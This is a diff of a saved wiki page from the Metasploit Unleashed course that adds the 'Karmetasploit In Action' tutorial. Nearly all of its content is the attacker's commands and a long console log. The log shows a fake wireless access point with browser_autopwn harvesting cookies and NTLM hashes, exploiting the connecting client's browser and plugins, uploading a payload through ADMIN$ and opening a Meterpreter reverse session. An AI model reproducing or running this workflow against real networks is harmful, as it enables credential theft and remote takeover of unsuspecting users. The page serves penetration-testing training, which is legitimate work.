@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Karmetasploit In Action - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Karmetasploit_In_Action" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Karmetasploit_In_Action&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_In_Action&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_In_Action&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,324 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Karmetasploit In Action</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Karmetasploit_In_Action#column-one">navigation</a>, <a href="Karmetasploit_In_Action#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Now, with everything ready, all that is left is to run Karmetasploit! We start up Metasploit, feeding it our run control file.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfconsole -r karma.rc</span>
+
+<span style='color:#00ffff;'>                                  _             
+                                 | |      o     
+ _  _  _    _ _|_  __,   ,    _  | |  __    _|_
+/ |/ |/ |  |/  |  /  |  / _|/ _|/  /  _|  |  
+  |  |  |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/
+                           /|                   
+                           |     </span>              
+
+
+       =[ <span style='color:#ff9900;'>metasploit v3.3-rc1 [core:3.3 api:1.0</span>]
++ -- --=[ 372 exploits - 234 payloads
++ -- --=[ 20 encoders - 7 nops
+       =[ 149 aux
+
+resource> load db_sqlite3
+<span style='color:#ff0000;'>[-]</span>
+<span style='color:#ff0000;'>[-]</span> The functionality previously provided by this plugin has been
+<span style='color:#ff0000;'>[-]</span> integrated into the core command set.  Use the new 'db_driver'
+<span style='color:#ff0000;'>[-]</span> command to use a database driver other than sqlite3 (which
+<span style='color:#ff0000;'>[-]</span> is now the default).  All of the old commands are the same.
+<span style='color:#ff0000;'>[-]</span>
+<span style='color:#ff0000;'>[-]</span> Failed to load plugin from /pentest/exploits/framework3/plugins/db_sqlite3: Deprecated plugin
+resource> db_create /root/karma.db
+<span style='color:#0000FF;'>[*]</span> Creating a new database instance...
+<span style='color:#0000FF;'>[*]</span> Successfully connected to the database
+<span style='color:#0000FF;'>[*]</span> File: /root/karma.db
+resource> use auxiliary/server/browser_autopwn
+resource> setg AUTOPWN_HOST 10.0.0.1
+AUTOPWN_HOST => 10.0.0.1
+resource> setg AUTOPWN_PORT 55550
+AUTOPWN_PORT => 55550
+resource> setg AUTOPWN_URI /ads
+AUTOPWN_URI => /ads
+resource> set LHOST 10.0.0.1
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#0000FF;'>[*]</span> Using URL: http://0.0.0.0:55550/hzr8QG95C
+<span style='color:#0000FF;'>[*]</span>  Local IP: http://192.168.2.2:55550/hzr8QG95C
+<span style='color:#0000FF;'>[*]</span> Server started.
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Server started.
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Server started.
+
+msf auxiliary(<span style='color:#ff0000;'>http</span>) ></pre>
+<br />
+At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake "captive portal" style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
+<br />
+<br />
+Now lets see what happens when a client connects to the fake AP we have set up.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>http</span>) >
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.msn.com:80 GET / Windows IE 5.01 cookies=MC1=V=3&amp;GUID=e2eabc69be554e3587acce84901a53d3; MUID=E7E065776DBC40099851B16A38DB8275; mh=MSFT; CULTURE=EN-US; zip=z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId=14; FlightId=BasePage; hpsvr=M:5|F:5|T:5|E:5|D:blu|W:F; hpcli=W.H|L.|S.|R.|U.L|C.|H.; ushpwea=wc:USNE0363; wpv=2
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> Request '/ads' from 10.0.0.100:1278
+<span style='color:#0000FF;'>[*]</span> Recording detection from User-Agent
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)
+<span style='color:#0000FF;'>[*]</span> Browser claims to be MSIE 5.01, running on Windows 2000
+<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1293 XID 97 (IN::A google.com)
+<span style='color:#0000FF;'>[*]</span> Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3
+...snip...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > ecademy.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > facebook.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > gather.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > gmail.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > gmail.google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > linkedin.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > livejournal.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > monster.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > myspace.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > ryze.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Sending MS03-020 Internet Explorer Object Type to 10.0.0.100:1278...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1360 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.monster.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
+<span style='color:#0000FF;'>[*]</span> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.myspace.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> AUTHENTICATED as TARGETP0WN3D...
+<span style='color:#0000FF;'>[*]</span> Connecting to the ADMIN$ share...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Regenerating the payload...
+<span style='color:#0000FF;'>[*]</span> Uploading payload...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.ryze.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.twitter.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.xing.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > xing.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Created UxsjordQ.exe...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Connecting to the Service Control Manager...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > care.com:80 GET / Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.gather.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Obtaining a service manager handle...
+<span style='color:#0000FF;'>[*]</span> Creating a new service...
+<span style='color:#0000FF;'>[*]</span> Closing service handle...
+<span style='color:#0000FF;'>[*]</span> Opening service...
+<span style='color:#0000FF;'>[*]</span> Starting the service...
+<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(191 bytes)
+<span style='color:#0000FF;'>[*]</span> Removing the service...
+<span style='color:#0000FF;'>[*]</span> Closing service handle...
+<span style='color:#0000FF;'>[*]</span> Deleting UxsjordQ.exe...
+<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
+<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
+<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1362 
+<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
+<span style='color:#0000FF;'>[*]</span> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
+<span style='color:#0000FF;'>[*]</span> AUTHENTICATED as TARGETP0WN3D...
+<span style='color:#0000FF;'>[*]</span> Ignoring request from 10.0.0.100, attack already in progress.
+<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
+<span style='color:#0000FF;'>[*]</span> Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
+<span style='color:#0000FF;'>[*]</span> Sending stage (2650 bytes)
+<span style='color:#0000FF;'>[*]</span> Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.care2.com:80 GET / Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET / Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET / Windows IE 5.01 cookies=
+<span style='color:#0000FF;'>[*]</span> Uploading DLL (75787 bytes)...
+<span style='color:#0000FF;'>[*]</span> Upload completed.
+<span style='color:#0000FF;'>[*]</span> Migrating to lsass.exe...
+<span style='color:#0000FF;'>[*]</span> Current server process: rundll32.exe (848)
+<span style='color:#0000FF;'>[*]</span> New server process: lsass.exe (232)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
+
+msf auxiliary(<span style='color:#ff0000;'>http</span>) > <span style='color:#13C16A;'>sessions -l</span>
+
+Active sessions
+===============
+
+  Id  Description  Tunnel                             
+  --  -----------  ------                             
+  1   Meterpreter  10.0.0.1:45017 -> 10.0.0.100:1364</pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Karmetasploit" title="Karmetasploit">Karmetasploit</a> &gt; Karmetasploit In Action</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=Configuration&amp;action=edit&amp;redlink=1" class="new" title="Configuration (page does not exist)">Configuration</a> &#124; <strong class="selflink">Karmetasploit In Action</strong> &#124; <a href="Attack_Analysis" title="Attack Analysis">Attack Analysis</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 500/1000000
+Preprocessor generated node count: 2623/1000000
+Post‐expand include size: 4374/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:111-0!*!0!*!*!*!* and timestamp 20131124100717 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_In_Action&amp;oldid=1546">http://www.offensive-security.com/w/index.php?title=Karmetasploit_In_Action&amp;oldid=1546</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Karmetasploit&amp;action=edit&amp;redlink=1" class="new" title="Category:Karmetasploit (page does not exist)">Karmetasploit</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +809,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.125 secs. --></body></html>
